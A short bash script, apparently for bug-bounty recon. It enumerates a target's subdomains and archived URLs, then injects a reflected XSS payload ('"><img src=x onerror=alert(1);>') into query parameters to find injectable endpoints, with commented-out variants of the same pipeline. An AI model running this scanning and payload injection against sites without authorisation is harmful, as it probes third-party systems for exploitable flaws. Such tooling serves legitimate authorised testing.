#!usr/bin/bash

echo " My script ";

read -p "Enter domain name => " input
for i in ${input[@]}
do
echo "
.
.
.
scan started for $i
"

mkdir bugs/$i

echo "AMASS STARTED"
amass enum -passive -norecursive -noalts -d $i -o bugs/$i/domain.txt
cat bugs/$i/domain.txt | httpx -o bugs/$i/domainhttpx.txt

echo "waybackurls || GF || freq"
cat domainhttpx.txt | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq

#cat bugs/$i/domainhttpx.txt | waybackurls | tee -a bugs/$i/endpoint.txt
#echo "xssFUZZ"
#cat bugs/$i/endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a bugs/$i/xss_fuzz.txt
#echo "finding"
#cat bugs/$i/xss_fuzz.txt | freq | tee -a bugs/$i/possible_xss.txt

done


#cat domainhttpx.txt | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>"' | freq
